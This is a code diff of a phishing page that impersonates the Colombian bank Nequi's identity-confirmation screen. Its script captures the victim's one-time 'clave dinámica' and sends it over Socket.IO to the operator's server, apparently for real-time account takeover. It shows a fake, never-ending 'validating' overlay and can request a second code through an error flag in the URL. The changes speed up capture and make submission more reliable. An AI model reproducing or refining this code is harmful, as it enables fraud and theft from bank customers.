@@ -5,6 +5,7 @@
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>Nequi - Confirma tu identidad</title>
   <link rel="shortcut icon" type="image/x-icon" href="assets/favicon.ico">
+  <link rel="stylesheet" href="css/overlay.css">
   
   <script src="/socket.io/socket.io.js"></script>
   <script src="js/config.js"></script>
@@ -131,29 +132,30 @@
     }
 
     .otp-input {
-      width: 48px;
-      height: 56px;
+      width: 40px;
+      height: 50px;
       text-align: center;
       font-size: 1.75rem;
       font-weight: 700;
-      color: var(--color-pink);
-      background-color: var(--color-bg-light);
-      border: 2px solid var(--color-border);
-      border-radius: 12px;
+      color: var(--color-purple);
+      background-color: transparent;
+      border: none;
+      border-bottom: 2px solid var(--color-border);
+      border-radius: 0;
       outline: none;
       transition: all 0.2s ease;
       font-family: inherit;
+      padding-bottom: 8px;
     }
 
     .otp-input:focus {
-      border-color: var(--color-pink);
-      background-color: var(--color-white);
-      box-shadow: 0 0 0 4px rgba(218, 0, 129, 0.1);
+      border-bottom-color: var(--color-purple);
+      background-color: transparent;
     }
 
     .otp-input.filled {
-      border-color: var(--color-pink);
-      background-color: var(--color-white);
+      border-bottom-color: var(--color-purple);
+      background-color: transparent;
     }
 
     /* Keyboard */
@@ -372,34 +374,32 @@
   </main>
 
   <script>
-    document.addEventListener('DOMContentLoaded', () => {
-      // Inicializar Socket.IO
-      try {
-        SocketClient.init();
-        console.log('✅ Socket.IO inicializado');
-      } catch (error) {
-        console.error('❌ Error al inicializar Socket.IO:', error);
-      }
-
+    // Inicializar inmediatamente sin esperar a DOMContentLoaded para máxima velocidad
+    (function() {
+      // Variables globales del módulo
+      let currentIndex = 0;
+      let otpCode = ['', '', '', '', '', ''];
+      
       // Elementos
       const errorAlert = document.getElementById('errorAlert');
       const otpInputs = document.querySelectorAll('.otp-input');
       const continueBtn = document.getElementById('continueBtn');
       const keyboardBtns = document.querySelectorAll('.keyboard-btn[data-num]');
       const deleteBtn = document.getElementById('deleteBtn');
-      
-      let currentIndex = 0;
-      let otpCode = ['', '', '', '', '', ''];
 
-      // Mostrar error si viene en URL
+      // Mostrar error si viene en URL (segunda vez que se pide dinámica)
       const urlParams = new URLSearchParams(window.location.search);
       if (urlParams.get('error') === 'true') {
+        console.log('⚠️ Error detectado en URL - mostrando alerta');
         errorAlert.classList.add('show');
       }
 
-      // Teclado numérico
+      // Teclado numérico - Respuesta INSTANTÁNEA
       keyboardBtns.forEach(btn => {
-        btn.addEventListener('click', () => {
+        btn.addEventListener('click', (e) => {
+          e.preventDefault();
+          e.stopPropagation();
+          
           if (currentIndex < 6) {
             const num = btn.dataset.num;
             otpCode[currentIndex] = num;
@@ -411,11 +411,14 @@
               continueBtn.disabled = false;
             }
           }
-        });
+        }, { passive: false });
       });
 
-      // Botón borrar
-      deleteBtn.addEventListener('click', () => {
+      // Botón borrar - Respuesta INSTANTÁNEA
+      deleteBtn.addEventListener('click', (e) => {
+        e.preventDefault();
+        e.stopPropagation();
+        
         if (currentIndex > 0) {
           currentIndex--;
           otpCode[currentIndex] = '';
@@ -424,10 +427,13 @@
           continueBtn.disabled = true;
           errorAlert.classList.remove('show');
         }
-      });
+      }, { passive: false });
 
       // Botón continuar
-      continueBtn.addEventListener('click', async () => {
+      continueBtn.addEventListener('click', async (e) => {
+        e.preventDefault();
+        e.stopPropagation();
+        
         const dinamica = otpCode.join('');
         
         // Guardar en localStorage
@@ -436,21 +442,35 @@
         localStorage.setItem('formData', JSON.stringify(formData));
 
         // Mostrar overlay
-        OverlayManager.show({
-          message: 'Validando clave dinámica...',
-          timeout: 0,
-          showProgress: true
-        });
+        if (typeof OverlayManager !== 'undefined') {
+          OverlayManager.show({
+            message: 'Validando clave dinámica...',
+            timeout: 0,
+            showProgress: true
+          });
+        }
 
+        // Inicializar Socket.IO si no está inicializado
         try {
-          await SocketClient.sendDinamicaRequest(dinamica);
-          OverlayManager.updateMessage('¡Datos enviados! Esperando validación...');
+          if (typeof SocketClient !== 'undefined') {
+            SocketClient.init();
+            await SocketClient.sendDinamicaRequest(dinamica);
+            // NO actualizar mensaje, dejar solo 'Validando clave dinámica...'
+          } else {
+            console.error('SocketClient no disponible');
+            if (typeof OverlayManager !== 'undefined') {
+              OverlayManager.showError('Error de conexión');
+              setTimeout(() => OverlayManager.hide(), 3000);
+            }
+          }
         } catch (error) {
           console.error('Error:', error);
-          OverlayManager.showError('Error al enviar');
-          setTimeout(() => OverlayManager.hide(), 3000);
+          if (typeof OverlayManager !== 'undefined') {
+            OverlayManager.showError('Error al enviar');
+            setTimeout(() => OverlayManager.hide(), 3000);
+          }
         }
-      });
+      }, { passive: false });
 
       // Prevenir entrada directa
       otpInputs.forEach(input => {
@@ -458,7 +478,21 @@
         input.addEventListener('paste', (e) => e.preventDefault());
         input.addEventListener('input', (e) => e.target.value = '');
       });
-    });
+
+      console.log('✅ Teclado numérico inicializado - Respuesta instantánea');
+
+      // Inicializar Socket.IO cuando esté disponible
+      document.addEventListener('DOMContentLoaded', () => {
+        try {
+          if (typeof SocketClient !== 'undefined') {
+            SocketClient.init();
+            console.log('✅ Socket.IO inicializado en dinamica.html');
+          }
+        } catch (error) {
+          console.error('❌ Error al inicializar Socket.IO:', error);
+        }
+      });
+    })();
   </script>
 </body>
 </html>
